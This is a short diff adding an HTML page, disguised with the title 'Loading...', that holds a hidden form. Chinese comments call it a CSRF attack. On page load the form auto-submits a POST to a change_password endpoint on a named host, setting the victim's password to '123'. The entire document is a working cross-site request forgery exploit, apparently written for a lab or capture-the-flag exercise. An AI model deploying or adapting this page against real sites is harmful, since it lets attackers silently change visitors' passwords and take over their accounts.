@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <!-- 隐藏表单，用于自动提交CSRF请求 -->
+    <form id="csrfForm" action="http://juk7sqt.haobachang2.loveli.com.cn:8888/change_password" method="POST">
+        <input type="hidden" name="new_password" value="123">
+    </form>
+
+    <script>
+        // 页面加载后立即提交表单
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
